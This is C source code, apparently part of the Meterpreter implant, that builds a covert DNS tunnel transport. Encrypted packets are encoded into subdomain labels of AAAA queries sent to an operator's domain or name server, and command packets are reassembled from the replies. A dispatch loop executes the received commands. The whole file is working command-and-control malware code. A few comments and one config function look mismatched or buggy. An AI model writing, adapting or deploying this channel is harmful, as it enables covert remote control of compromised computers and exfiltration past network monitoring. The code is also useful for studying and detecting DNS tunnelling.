/*!
 * @file server_transport_http.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include "../../common/config.h"
#include "server_transport_windns.h"
#include <ws2tcpip.h>
#include <windns.h>
#pragma comment (lib, "Dnsapi.lib")


/*!
 * @brief Wrapper around DNS-specific sending functionality.
 * @param hReq DNS request domain.
 * @return An indication of the result of sending the request.
 */
BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter,IncapuslatedDns *recieve, PIP4_ARRAY pip4, wchar_t* reqz)
{
	
	DWORD tries = 1000;

	DnsTunnel* xxx[17];
	wchar_t sub_c[7];
	UINT current_recieved = 0;
	UINT need_to_recieve = 0;
	BOOL force_next;
	BOOL force_stop;
	BOOL ready = FALSE;
	DNS_STATUS dns_status;
	PDNS_RECORD result = NULL;
	PDNS_RECORD result_iter = NULL;
	wchar_t *request;
	
	xxx[0] = NULL;

	do {
		force_next = FALSE;
		force_stop = FALSE;

		request = (wchar_t *)calloc(250, sizeof(wchar_t));

		for (int i = 1; i < 17; i++){
			xxx[i] = NULL;
		}

		_itow_s(*counter, sub_c, 6, 10);
		++(*counter);

		wcscat_s(request, 250, sub_seq);
        wcscat_s(request, 250, L".");
		wcscat_s(request, 250, reqz);
        wcscat_s(request, 250, L".");
		wcscat_s(request, 250, sub_c);
		wcscat_s(request, 250, L".");
		wcscat_s(request, 250, domain);

		vdprintf("[PACKET RECEIVE WINDNS] request: %S", request);


		//dwRetval = getaddrinfo(request, NULL, &ctx->hints, &result); DNS_QUERY_STANDARD DNS_QUERY_BYPASS_CACHE

		dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pip4, &result, NULL);
		//dns_status = GetAddrInfoW(request, L"", &phints, &result);

		SAFE_FREE(request);
        vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
		if (dns_status != 0) {
			
			tries--;
			force_next = TRUE;
			//recieve->status = ERROR_READ_FAULT;
			continue;
		}

		if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {
			//if (result->ai_addr != NULL) {

			result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
			result_iter->pNext = result;
			//result_iter =(PADDRINFOW)calloc(1, sizeof(ADDRINFOW));
			//result_iter->ai_next = result;
			do {
				result_iter = result_iter->pNext;
				DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);

				//result_iter = result_iter->ai_next;
				//VOID * xxxx = (result_iter->ai_addr->sa_data) + 6;
				//DnsTunnel* tmp = ((DnsTunnel *)xxxx);

				if ((UCHAR)(tmp->index_size) == 0x81 && tmp->ff == 0xfe)
				{
					xxx[0] = tmp;
				}
				else {
					UINT idx = ((UCHAR)(tmp->index_size) >> 4) + 1;
					if (idx < 17) {
						xxx[idx] = tmp;
					}
					else {
						force_stop = TRUE; // ERROR
						vdprintf("[PACKET RECEIVE WINDNS] DNS INDEX error");
						//recieve->status = ERROR_READ_FAULT;
						break;
					}

				}


			} while (result_iter->pNext != NULL);
			//} while (result_iter->ai_next!= NULL);

			if (xxx[0] != NULL){
				memcpy(sub_seq, xxx[0]->block.header.next_sub_seq, 8);
                *counter = 0;
			}
			else
			{
				vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error");
				force_stop = TRUE; // ERROR
				//recieve->status = ERROR_READ_FAULT;
				break;
			}
		}
		else {
            vdprintf("[PACKET RECEIVE WINDNS] NO IP");
			force_next = TRUE;
			tries--;
			continue;
		}

		if ((xxx[0]->block.header.status_flag == 1 || xxx[0]->block.header.status_flag == 0) && need_to_recieve == 0 && xxx[0]->block.header.size > 0){ // First packet

			recieve->packet = (PUCHAR)calloc(xxx[0]->block.header.size, sizeof(char));
			need_to_recieve = xxx[0]->block.header.size;

			vdprintf("[PACKET RECEIVE WINDNS] get ready for %d bytes", need_to_recieve);

			UINT i = 1;
			while (i < 17 && xxx[i] != NULL){
				if ((xxx[i]->index_size & 0x0f) < 16){
					memcpy(recieve->packet + current_recieved, xxx[i]->block.data, (xxx[i]->index_size & 0x0f)); // copy packet
					current_recieved += (xxx[i]->index_size & 0x0f);
				}
				else {
					vdprintf("[PACKET RECEIVE WINDNS] INDEX overflow error");
					force_stop = TRUE; // ERROR
					recieve->status = ERROR_READ_FAULT;
					break;
				}

				i++;

			}

		}
		else if (xxx[0]->block.header.status_flag > 1 && need_to_recieve > 0 && recieve->packet != NULL) { // Continue recieveing packets

			UINT i = 1;
			while (i < 17 && xxx[i] != NULL){
				if ((xxx[i]->index_size & 0x0f) < 16){
					memcpy(recieve->packet + current_recieved, xxx[i]->block.data, (xxx[i]->index_size & 0x0f)); // copy packet
					current_recieved += (xxx[i]->index_size & 0x0f);
                    //vdprintf("[PACKET RECEIVE WINDNS] got %d from %d ", current_recieved, need_to_recieve);
				}
				else {
					vdprintf("[PACKET RECEIVE WINDNS] INDEX overflow error");
					force_stop = TRUE; // ERROR
					//recieve->status = ERROR_READ_FAULT;
					break;
				}

				i++;
			}

			if (current_recieved < need_to_recieve){
				force_next = TRUE;
			}

		}

		vdprintf("[PACKET RECEIVE WINDNS] recieved %d bytes", current_recieved);

	} while ((force_next == TRUE || xxx[0]->block.header.status_flag == 1) && force_stop == FALSE && tries > 0);

	if (need_to_recieve == current_recieved && force_stop == FALSE  && tries > 0){
		ready = FALSE;
		if (need_to_recieve == 0)
		{
			recieve->status = DNS_INFO_NO_RECORDS;
			recieve->size = 0;
            vdprintf("[PACKET RECEIVE WINDNS] NO RECORDS");
		}
		else {
			recieve->status = ERROR_SUCCESS;
			recieve->size = need_to_recieve;
            vdprintf("[PACKET RECEIVE WINDNS] PACKET READY");
		}
	}
	else{
		if (recieve->packet != NULL){
			SAFE_FREE(recieve->packet);
			recieve->size = 0;
		}

		vdprintf("[PACKET RECEIVE WINDNS] recv. error");
		recieve->status = ERROR_READ_FAULT;
		recieve->size = 0;
        return FALSE;
	}



	vdprintf("[PACKET RECEIVE WINDNS] packet recieved with size (%d)",recieve->size);
	
	return TRUE;
}

/*!
 * @brief Wrapper around DNS-specific sending functionality.
 * @param hReq DNS request handle.
 * @param buffer Pointer to the buffer to receive the data.
 * @param size Buffer size.
 * @return An indication of the result of sending the request.
 */
static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, wchar_t* reqz, PUSHORT counter, PIP4_ARRAY pip4, LPVOID buffer, DWORD size, IncapuslatedDns *recieved)
{
	BOOL data = FALSE;
	
		if(buffer == NULL || size == 0){
			data = get_packet_from_windns(domain, subdomain, counter, recieved, pip4, reqz);
		} else if (buffer != NULL && size > 0) {
			data = FALSE;
		}
		
	return data;
}


/*!
 * @brief Windows-specific function to transmit a packet via DNS
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	DWORD ret = 0;
	DWORD tries = 100;
	DnsTransportContext* ctx = (DnsTransportContext*)remote->transport->ctx;
	unsigned char *buffer;
	wchar_t *base64 = NULL;
	BOOL res;
	wchar_t sub_c[7];
	DWORD rest_len;
	DWORD parts;
	DWORD parts_last;
	DWORD shift;
	DWORD current_sent = 0;
	DWORD need_to_send = 0;
	BOOL force_next;
	BOOL force_stop;
	DNS_STATUS dns_status;
	PDNS_RECORD result = NULL;
	PDNS_RECORD result_iter = NULL;
	PUSHORT counter = &ctx->counter;
	PIP4_ARRAY pSrvList = (PIP4_ARRAY)ctx->pip4;
	wchar_t *domain = ctx->domain;

	wchar_t *request = NULL;

	DWORD totalLength = packet->payloadLength + sizeof(PacketHeader);

	if (ctx->ready == FALSE){
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}
	buffer = malloc(totalLength);
	if (!buffer)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	memcpy(buffer, &packet->header, sizeof(PacketHeader));
	memcpy(buffer + sizeof(PacketHeader), packet->payload, packet->payloadLength);
	
	res = CryptBinaryToStringW((BYTE *)buffer, totalLength, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &need_to_send);
	base64 = (wchar_t *)calloc(need_to_send, sizeof(wchar_t));
	res = CryptBinaryToStringW((BYTE *)buffer, totalLength, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &need_to_send);

    vdprintf("[PACKET TRANCIEVE WINDNS] BEFOR: %S",base64);
    
	while (base64[need_to_send - 1] == L'=') --need_to_send;

	DWORD i = 0;
	while (base64[i] != L'\0')
	{
		if (base64[i] == L'+')
		{
			base64[i] = L'-';
		}
		else if (base64[i] == L'/')
		{
			base64[i] = L'_';
		}
		i++;
	}
    vdprintf("[PACKET TRANCIEVE WINDNS] AFT: %S",base64);
	wcscpy_s(base64 + need_to_send, 1, L"\x00");

	
	do{
		request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
		_itow_s(need_to_send, request, MAX_DNS_NAME_SIZE, 10);
		_itow_s(*counter, sub_c, 6, 10);

		wcscat_s(request, MAX_DNS_NAME_SIZE, L".tx.");
		wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
		wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
		wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
		force_stop = FALSE;
		vdprintf("[PACKET TRANCIEVE WINDNS] HEADER request: %S", request);
		dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
		SAFE_FREE(request);
		if (dns_status != 0) {
			vdprintf("[PACKET TRANCIEVE WINDNS] DnsQuery status code is %d", dns_status);
			tries--;
			++(*counter);
			ret = dns_status;
			continue;
		}

		DnsTunnel* tmp = ((DnsTunnel *)result->Data.AAAA.Ip6Address.IP6Byte);
		if (tmp != NULL && tmp->block.header.status_flag == 0){
			force_stop = TRUE;
		}
		else {
			vdprintf("[PACKET TRANCIEVE WINDNS] Header error");
			ret = DNS_ERROR_INVALID_IP_ADDRESS;
			tries--;
		}
	} while (force_stop == FALSE && tries > 0);

	if (force_stop == TRUE){

		do {

			_itow_s(*counter, sub_c, 6, 10);

			force_next = FALSE;
			force_stop = FALSE;

			request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
			rest_len = MAX_DNS_NAME_SIZE - wcslen(domain) - 5 - wcslen(sub_c);
			rest_len = min(rest_len, need_to_send - current_sent);
			parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
			parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);
			rest_len -= parts;

			DWORD i = 0;
			DWORD shift2 = current_sent;
			shift = 0;
			for (; i < parts; i++){
				wcsncat_s(request, MAX_DNS_NAME_SIZE, base64 + shift2, MAX_DNS_SUBNAME_SIZE);
				shift += MAX_DNS_SUBNAME_SIZE;
				shift2 += MAX_DNS_SUBNAME_SIZE;
				wcsncat_s(request, MAX_DNS_NAME_SIZE, L".", 1);
				shift += 1;
			}

			if (parts_last > 0){
				wcsncat_s(request, MAX_DNS_NAME_SIZE, base64 + shift2, parts_last);
				shift += parts_last;
				shift2 += parts_last;
                wcsncat_s(request, MAX_DNS_NAME_SIZE, L".", 1);
			}

			wcscat_s(request, MAX_DNS_NAME_SIZE, L"t.");
			wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
			wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
			wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
			wcscat_s(request, MAX_DNS_NAME_SIZE, L"\x00");

			vdprintf("[PACKET TRANCIEVE WINDNS] request: %S", request);

			dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
			SAFE_FREE(request);

			if (dns_status != 0) {
				vdprintf("[PACKET TRANCIEVE WINDNS] DnsQuery status code is %d", dns_status);
				tries--;
				++(*counter);
				//Sleep(1000);
				force_next = TRUE;
				ret = dns_status;
				//recieve->status = ERROR_READ_FAULT;
				continue;
			}



			if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {
				DnsTunnel* tmp = ((DnsTunnel *)result->Data.AAAA.Ip6Address.IP6Byte);
				if (tmp->index_size == 0xff && tmp->block.header.status_flag == 0xf0)
				{
					current_sent = shift2;
					++(*counter);
					vdprintf("[PACKET TRANCIEVE WINDNS] sent: %d from %d", current_sent, need_to_send);
				}
                else if(tmp->index_size == 0xff && tmp->block.header.status_flag == 0xff && current_sent == need_to_send){
                    current_sent = shift2;
					++(*counter);
					vdprintf("[PACKET TRANCIEVE WINDNS] repeat (finish): %d from %d", current_sent, need_to_send);      
                }
				else {
					// ERROR
					vdprintf("[PACKET TRANCIEVE WINDNS] response error, wrong header 0x%x (%d from %d)", tmp->block.header.status_flag, current_sent, need_to_send);
					ret = DNS_ERROR_INVALID_IP_ADDRESS;
					force_stop = TRUE;
				}
			}
			else {
				vdprintf("[PACKET TRANCIEVE WINDNS] response error, no data");
				tries--;
				++(*counter);
				force_next = TRUE;
				ret = DNS_ERROR_NO_PACKET;
				continue;

			}



		} while ((force_next == TRUE && tries > 0) || (force_stop == FALSE && tries > 0 && current_sent != need_to_send));
	}

	SAFE_FREE(buffer);
	SAFE_FREE(base64);
	vdprintf("[PACKET TRANCIEVE WINDNS] res: %d %d ",current_sent, need_to_send);
	if (force_stop == FALSE && tries > 0 && current_sent == need_to_send){
        vdprintf("[PACKET TRANCIEVE WINDNS] cool");
		ret = ERROR_SUCCESS;
	}

	
	
	return ret;
}

/*!
 * @brief Transmit a packet via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_via_dns(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	CryptoContext *crypto;
	Tlv requestId;
	DWORD res;
    dprintf("[PACKET] TRANSMIT... 1 %x", packet);
	lock_acquire(remote->lock);
    dprintf("[PACKET] TRANSMIT... 1.0 %x", packet);
	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;
        dprintf("[PACKET] TRANSMIT... 1.2");
		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
        dprintf("[PACKET] TRANSMIT... 1.3");
	}
    dprintf("[PACKET] TRANSMIT... 2");

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
            dprintf("[PACKET] TRANSMIT... 2.2");
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;
            dprintf("[PACKET] TRANSMIT... 2.3");
			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
                dprintf("[PACKET] TRANSMIT... 2.4");
				SetLastError(res);
				break;
			}
            dprintf("[PACKET] TRANSMIT... 2.5");
			// Destroy the original payload as we no longer need it
			free(origPayload);
            dprintf("[PACKET] TRANSMIT... 2.6");
			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
            dprintf("[PACKET] TRANSMIT... 2.7");
		}

		dprintf("[PACKET] New xor key for sending");
		packet->header.xor_key = rand_xor_key();
		dprintf("[PACKET] XOR Encoding payload");
		// before transmission, xor the whole lot, starting with the body
		xor_bytes(packet->header.xor_key, (LPBYTE)packet->payload, packet->payloadLength);
		dprintf("[PACKET] XOR Encoding header");
		// then the header
		xor_bytes(packet->header.xor_key, (LPBYTE)&packet->header.length, 8);
		// be sure to switch the xor header before writing
		packet->header.xor_key = htonl(packet->header.xor_key);

		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
		res = packet_transmit_dns(remote, packet, completion);
		if (res != 0)
		{
			dprintf("[PACKET] transmit failed with return %d\n", res);
			SetLastError(res);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Windows-specific function to receive a new packet via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD packet_receive_dns(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res = ERROR_SUCCESS;
	Packet *localPacket = NULL;
	PacketHeader header;
	//LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	DnsTransportContext* ctx = (DnsTransportContext*)remote->transport->ctx;
	DWORD retries = 5;
	IncapuslatedDns recieved;
	CryptoContext* crypto = NULL;
	wchar_t *sub_seq = L"aaaa";
	
	recieved.packet = NULL;
	
	lock_acquire(remote->lock);
	
	
	if (ctx->ready == TRUE){
		vdprintf("[PACKET RECEIVE DNS] sending req: %S", ctx->domain);
		BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, L"g", &ctx->counter, ctx->pip4, NULL, 0, &recieved);

		if (rcvStatus == TRUE && recieved.status == ERROR_SUCCESS) // Handle response
		{
			vdprintf("[PACKET RECEIVE DNS] Data recieved: %u bytes", recieved.size);
			
			//read header
			memcpy(&header, recieved.packet, sizeof(PacketHeader));
			dprintf("[PACKET RECEIVE DNS] decoding header");
           
			header.xor_key = ntohl(header.xor_key);
            xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);
			header.length = ntohl(header.length);
            dprintf("[PACKET RECEIVE DNS] key:0x%x len:0x%x",header.xor_key, header.length);
			// Initialize the header
			vdprintf("[PACKET RECEIVE DNS] tlv length: %d", header.length);
			// use TlvHeader size here, because the length doesn't include the xor byte
			payloadLength = header.length - sizeof(TlvHeader);
			// Allocate the payload
			if (!(payload = (PUCHAR)malloc(payloadLength)))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
                vdprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");
			
			} else {
               
                dprintf("[PACKET RECEIVE DNS] alloc %d",payloadLength);
                
                memcpy(payload, recieved.packet + sizeof(header), payloadLength);
                    
				dprintf("[PACKET RECEIVE DNS] decoding payload");
				xor_bytes(header.xor_key, payload, payloadLength);

				// Allocate a packet structure
				if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
				{
					SetLastError(ERROR_NOT_ENOUGH_MEMORY);
                    dprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");
				} else {

					memset(localPacket, 0, sizeof(Packet));
					
					// If the connection has an established cipher and this packet is not
					// plaintext, decrypt
					if ((crypto = remote_get_cipher(remote)) &&
						(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
						(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
					{
						ULONG origPayloadLength = payloadLength;
						PUCHAR origPayload = payload;
                        dprintf("[PACKET RECEIVE DNS] decrypting");
						// Decrypt
						if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
						{
							SetLastError(res);
						}

						// We no longer need the encrypted payload
						free(origPayload);
					} else 
                    {
                        dprintf("[PACKET RECEIVE DNS] plain-text");
                        res = ERROR_SUCCESS;
                    }
					
					if (res == ERROR_SUCCESS) {
						localPacket->header.length = header.length;
						localPacket->header.type = header.type;
						localPacket->payload = payload;
						localPacket->payloadLength = payloadLength;
                        
						*packet = localPacket;
                        dprintf("[PACKET RECEIVE DNS] got packet: %x %x %x %x",localPacket->header.length, localPacket->header.type, localPacket->payload, localPacket->payloadLength );
						SetLastError(ERROR_SUCCESS);
					}
				}
			}
			
			// Cleanup on failure
			if (res != ERROR_SUCCESS)
			{
				if (payload)
				{
					free(payload);
				}
				if (localPacket)
				{
					free(localPacket);
				}
			}
			
			
		}else if (recieved.status == DNS_INFO_NO_RECORDS) // No data
		{
			
			SetLastError(DNS_INFO_NO_RECORDS);
			res = DNS_INFO_NO_RECORDS;
			
		}else if (recieved.status == ERROR_READ_FAULT){ // ERROR
			
			SetLastError(ERROR_READ_FAULT);
			res = ERROR_READ_FAULT;
			
		} else {
			
			SetLastError(ERROR_READ_FAULT);
			res = ERROR_READ_FAULT;
			
		}
	} else { // Transport not ready
		
		SetLastError(ERROR_NOT_READY);
		res = ERROR_NOT_READY;
		
	}
	
	lock_release(remote->lock);

	return res;
}


/*!
 * @brief Initialise the DNS connection (WSAScoket).
 * @param remote Pointer to the remote instance with the DNS transport details wired in.
 * @return Indication of success or failure.
 */
static BOOL server_init_windns(Transport* transport)
{
	DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;
	LPWSADATA wsaData;
	PIP4_ARRAY pSrvList = NULL;
	
	dprintf("[WINDNS] Initialising ...");
	
	wsaData = (LPWSADATA)calloc(1, sizeof(WSADATA));
	
	if ( (WSAStartup(MAKEWORD(2, 2), wsaData))!= 0) {
		printf("[WINDNS] WSAStartup failed");
		return FALSE;
	}
	
	
	if (ctx->ns_server!= NULL && wcscmp(ctx->ns_server, L"") != 0){
		char temp[260];
		sprintf_s(temp,MAX_PATH,"%S", ctx->ns_server);
		pSrvList = (PIP4_ARRAY)calloc(1, sizeof(IP4_ARRAY));
		DWORD ip;
		inet_pton(AF_INET, temp, (PVOID)&ip);
		pSrvList->AddrArray[0] = ip;
		pSrvList->AddrCount = 1;
		
		ctx->pip4 = (PVOID)pSrvList;
	}


	//ZeroMemory(&ctx->hints, sizeof(&ctx->hints));
	//ctx->hints.ai_family = AF_INET6;
	//ctx->hints.ai_socktype = SOCK_STREAM;
	
	ctx->ready = TRUE;
	dprintf("[DISPATCH] DNS Ready");

	return TRUE;
}

/*!
 * @brief Deinitialise the DNS connection.
 * @param remote Pointer to the remote instance with the DNS transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_dns(Transport* transport)
{
	DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

	dprintf("[DNS] Deinitialising ...");

	if (ctx->ready == TRUE)
	{
		ctx->ready = FALSE;
	}

	return TRUE; 
}

/*!
 * @brief The servers main dispatch loop for incoming requests using DNS
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet* packet = NULL;
	THREAD* cpt = NULL;
	DWORD ecount = 0;
	DWORD delay = 0;
	Transport* transport = remote->transport;
	DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

	while (running)
	{
		if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->sess_expiry_end != 0 && remote->sess_expiry_end < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->sess_expiry_end);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the DNS: %S", ctx->domain);
		result = packet_receive_dns(remote, &packet);

		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == DNS_INFO_NO_RECORDS)
			{
				transport->comms_last_packet = current_unix_timestamp();
			}

			delay = 10 * ecount;
			if (ecount >= 10)
			{
				delay *= 10;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
		}
		else
		{
			transport->comms_last_packet = current_unix_timestamp();

			// Reset the empty count when we receive a packet
			ecount = 0;

			dprintf("[DISPATCH] Returned result: %d, %x", result,packet);

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}
	}

	return result;
}

/*!
 * @brief Destroy the DNS transport.
 * @param transport Pointer to the DNS transport to reset.
 */
static void transport_destroy_dns(Transport* transport)
{

	DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

	dprintf("[TRANS DNS] Destroying http transport for DNS %S", ctx->domain);

	if (ctx)
		{
			if(ctx->domain){
				SAFE_FREE(ctx->domain);
			}
			if(ctx->ns_server){
				SAFE_FREE(ctx->ns_server);
			}
			if(ctx->pip4){
				SAFE_FREE(ctx->pip4)
			}
			ctx->ready = FALSE;
		}
	SAFE_FREE(transport);

}

void transport_write_dns_config(Transport* transport, MetsrvTransportDns* config)
{
	DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

	config->common.comms_timeout = transport->timeouts.comms;
	config->common.retry_total = transport->timeouts.retry_total;
	config->common.retry_wait = transport->timeouts.retry_wait;
	wcsncpy(config->common.url, transport->url, URL_SIZE);
	if (ctx->ns_server)
	{
		wcsncpy(config->ns_server, ctx->ns_server, NS_NAME_SIZE);
	}
	if (ctx->domain)
	{
		wcsncpy(config->ns_server, ctx->domain, DOMAIN_NAME_SIZE);
	}
	//config->type = ctx->type;
	
}

/*!
 * @brief Create an DNS transport from the given settings.
 * @param config Pointer to the DNS configuration block.
 * @return Pointer to the newly configured/created DNS transport instance.
 */
Transport* transport_create_dns(MetsrvTransportDns* config)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	DnsTransportContext* ctx = (DnsTransportContext*)malloc(sizeof(DnsTransportContext));
	wchar_t *domain;
	
	dprintf("[TRANS DNS] Creating DNS transport for domain %S", config->common.url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(DnsTransportContext));
	
	
	//ctx->create_req = get_request_windns;
	//ctx->send_req = send_request_windns;
	//ctx->close_req = close_request_windns;
	//ctx->validate_response = validate_response_windns;
	//ctx->receive_response = receive_response_windns;
	//ctx->read_response = read_response_windns;

	transport->timeouts.comms = config->common.comms_timeout;
	transport->timeouts.retry_total = config->common.retry_total;
	transport->timeouts.retry_wait = config->common.retry_wait;
	transport->type = METERPRETER_TRANSPORT_DNS;
	
	domain = wcsstr(config->common.url, L"dns://");
	
	if (domain == NULL){
		domain = config->common.url;
	}	
	
	ctx->domain = _wcsdup(domain + 6);
	
	ctx->ns_server = _wcsdup(config->ns_server);
	//ctx->type = config->type;
	ctx->counter = 0;
	ctx->pip4 = NULL;
		
	transport->packet_transmit = packet_transmit_via_dns;
	transport->server_dispatch = server_dispatch_dns;
	transport->transport_init = server_init_windns;
	transport->transport_deinit = server_deinit_dns;
	transport->transport_destroy = transport_destroy_dns;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();

	return transport;
}
